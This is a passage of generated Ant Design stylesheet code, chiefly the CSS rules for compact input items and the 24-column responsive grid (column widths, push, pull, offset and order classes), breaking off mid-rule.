    :where(.css-dev-only-do-not-override-pr0fja).ant-input-search.ant-input-compact-item>.ant-input-affix-wrapper-focused {
      z-index: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-last-item) {
      margin-inline-end: -1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:hover,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:focus,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:active {
      z-index: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item[disabled] {
      z-index: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-first-item):not(.ant-input-compact-last-item) {
      border-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-last-item).ant-input-compact-first-item,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-last-item).ant-input-compact-first-item.ant-input-sm,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-last-item).ant-input-compact-first-item.ant-input-lg {
      border-start-end-radius: 0;
      border-end-end-radius: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-first-item).ant-input-compact-last-item,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-first-item).ant-input-compact-last-item.ant-input-sm,
    :where(.css-dev-only-do-not-override-pr0fja).ant-input-compact-item:not(.ant-input-compact-first-item).ant-input-compact-last-item.ant-input-lg {
      border-start-start-radius: 0;
      border-end-start-radius: 0;
    }
  </style>
  <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1hglh2p" data-token-hash="icxjto" data-cache-path="icxjto|Grid-Grid|ant-col|anticon">
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, 'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
      font-size: 14px;
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"] [class^="ant-col"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] [class^="ant-col"],
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"] [class*=" ant-col"],
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] [class*=" ant-col"] {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"] [class^="ant-col"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] [class^="ant-col"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"] [class*=" ant-col"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] [class*=" ant-col"]::before,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"] [class^="ant-col"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] [class^="ant-col"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class^="ant-col"] [class*=" ant-col"]::after,
    :where(.css-dev-only-do-not-override-pr0fja)[class*=" ant-col"] [class*=" ant-col"]::after {
      box-sizing: border-box;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col {
      position: relative;
      max-width: 100%;
      min-height: 1px;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-24 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 100%;
      max-width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-24 {
      inset-inline-start: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-24 {
      inset-inline-end: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-24 {
      margin-inline-start: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-24 {
      order: 24;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-23 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 95.83333333333334%;
      max-width: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-23 {
      inset-inline-start: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-23 {
      inset-inline-end: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-23 {
      margin-inline-start: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-23 {
      order: 23;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-22 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 91.66666666666666%;
      max-width: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-22 {
      inset-inline-start: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-22 {
      inset-inline-end: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-22 {
      margin-inline-start: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-22 {
      order: 22;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-21 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 87.5%;
      max-width: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-21 {
      inset-inline-start: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-21 {
      inset-inline-end: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-21 {
      margin-inline-start: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-21 {
      order: 21;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-20 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 83.33333333333334%;
      max-width: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-20 {
      inset-inline-start: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-20 {
      inset-inline-end: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-20 {
      margin-inline-start: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-20 {
      order: 20;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-19 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 79.16666666666666%;
      max-width: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-19 {
      inset-inline-start: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-19 {
      inset-inline-end: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-19 {
      margin-inline-start: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-19 {
      order: 19;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-18 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 75%;
      max-width: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-18 {
      inset-inline-start: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-18 {
      inset-inline-end: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-18 {
      margin-inline-start: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-18 {
      order: 18;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-17 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 70.83333333333334%;
      max-width: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-17 {
      inset-inline-start: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-17 {
      inset-inline-end: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-17 {
      margin-inline-start: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-17 {
      order: 17;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-16 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 66.66666666666666%;
      max-width: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-16 {
      inset-inline-start: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-16 {
      inset-inline-end: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-16 {
      margin-inline-start: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-16 {
      order: 16;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-15 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 62.5%;
      max-width: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-15 {
      inset-inline-start: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-15 {
      inset-inline-end: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-15 {
      margin-inline-start: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-15 {
      order: 15;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-14 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 58.333333333333336%;
      max-width: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-14 {
      inset-inline-start: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-14 {
      inset-inline-end: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-14 {
      margin-inline-start: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-14 {
      order: 14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-13 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 54.166666666666664%;
      max-width: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-13 {
      inset-inline-start: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-13 {
      inset-inline-end: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-13 {
      margin-inline-start: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-13 {
      order: 13;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-12 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 50%;
      max-width: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-12 {
      inset-inline-start: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-12 {
      inset-inline-end: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-12 {
      margin-inline-start: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-12 {
      order: 12;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-11 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 45.83333333333333%;
      max-width: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-11 {
      inset-inline-start: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-11 {
      inset-inline-end: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-11 {
      margin-inline-start: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-11 {
      order: 11;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-10 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 41.66666666666667%;
      max-width: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-10 {
      inset-inline-start: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-10 {
      inset-inline-end: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-10 {
      margin-inline-start: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-10 {
      order: 10;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-9 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 37.5%;
      max-width: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-9 {
      inset-inline-start: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-9 {
      inset-inline-end: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-9 {
      margin-inline-start: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-9 {
      order: 9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-8 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 33.33333333333333%;
      max-width: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-8 {
      inset-inline-start: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-8 {
      inset-inline-end: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-8 {
      margin-inline-start: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-8 {
      order: 8;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-7 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 29.166666666666668%;
      max-width: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-7 {
      inset-inline-start: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-7 {
      inset-inline-end: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-7 {
      margin-inline-start: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-7 {
      order: 7;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-6 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 25%;
      max-width: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-6 {
      inset-inline-start: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-6 {
      inset-inline-end: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-6 {
      margin-inline-start: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-6 {
      order: 6;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-5 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 20.833333333333336%;
      max-width: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-5 {
      inset-inline-start: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-5 {
      inset-inline-end: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-5 {
      margin-inline-start: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-5 {
      order: 5;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-4 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 16.666666666666664%;
      max-width: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-4 {
      inset-inline-start: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-4 {
      inset-inline-end: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-4 {
      margin-inline-start: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-4 {
      order: 4;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-3 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 12.5%;
      max-width: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-3 {
      inset-inline-start: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-3 {
      inset-inline-end: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-3 {
      margin-inline-start: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-3 {
      order: 3;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-2 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 8.333333333333332%;
      max-width: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-2 {
      inset-inline-start: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-2 {
      inset-inline-end: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-2 {
      margin-inline-start: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-2 {
      order: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-1 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 4.166666666666666%;
      max-width: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-1 {
      inset-inline-start: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-1 {
      inset-inline-end: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-1 {
      margin-inline-start: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-1 {
      order: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-0 {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
      inset-inline-start: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
      inset-inline-end: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-offset-0 {
      margin-inline-start: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-order-0 {
      order: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-24 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 100%;
      max-width: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-24 {
      inset-inline-start: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-24 {
      inset-inline-end: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-24 {
      margin-inline-start: 100%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-24 {
      order: 24;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-23 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 95.83333333333334%;
      max-width: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-23 {
      inset-inline-start: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-23 {
      inset-inline-end: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-23 {
      margin-inline-start: 95.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-23 {
      order: 23;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-22 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 91.66666666666666%;
      max-width: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-22 {
      inset-inline-start: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-22 {
      inset-inline-end: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-22 {
      margin-inline-start: 91.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-22 {
      order: 22;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-21 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 87.5%;
      max-width: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-21 {
      inset-inline-start: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-21 {
      inset-inline-end: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-21 {
      margin-inline-start: 87.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-21 {
      order: 21;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-20 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 83.33333333333334%;
      max-width: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-20 {
      inset-inline-start: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-20 {
      inset-inline-end: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-20 {
      margin-inline-start: 83.33333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-20 {
      order: 20;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-19 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 79.16666666666666%;
      max-width: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-19 {
      inset-inline-start: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-19 {
      inset-inline-end: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-19 {
      margin-inline-start: 79.16666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-19 {
      order: 19;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-18 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 75%;
      max-width: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-18 {
      inset-inline-start: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-18 {
      inset-inline-end: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-18 {
      margin-inline-start: 75%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-18 {
      order: 18;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-17 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 70.83333333333334%;
      max-width: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-17 {
      inset-inline-start: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-17 {
      inset-inline-end: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-17 {
      margin-inline-start: 70.83333333333334%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-17 {
      order: 17;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-16 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 66.66666666666666%;
      max-width: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-16 {
      inset-inline-start: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-16 {
      inset-inline-end: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-16 {
      margin-inline-start: 66.66666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-16 {
      order: 16;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-15 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 62.5%;
      max-width: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-15 {
      inset-inline-start: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-15 {
      inset-inline-end: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-15 {
      margin-inline-start: 62.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-15 {
      order: 15;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-14 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 58.333333333333336%;
      max-width: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-14 {
      inset-inline-start: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-14 {
      inset-inline-end: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-14 {
      margin-inline-start: 58.333333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-14 {
      order: 14;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-13 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 54.166666666666664%;
      max-width: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-13 {
      inset-inline-start: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-13 {
      inset-inline-end: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-13 {
      margin-inline-start: 54.166666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-13 {
      order: 13;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-12 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 50%;
      max-width: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-12 {
      inset-inline-start: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-12 {
      inset-inline-end: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-12 {
      margin-inline-start: 50%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-12 {
      order: 12;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-11 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 45.83333333333333%;
      max-width: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-11 {
      inset-inline-start: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-11 {
      inset-inline-end: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-11 {
      margin-inline-start: 45.83333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-11 {
      order: 11;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-10 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 41.66666666666667%;
      max-width: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-10 {
      inset-inline-start: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-10 {
      inset-inline-end: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-10 {
      margin-inline-start: 41.66666666666667%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-10 {
      order: 10;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-9 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 37.5%;
      max-width: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-9 {
      inset-inline-start: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-9 {
      inset-inline-end: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-9 {
      margin-inline-start: 37.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-9 {
      order: 9;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-8 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
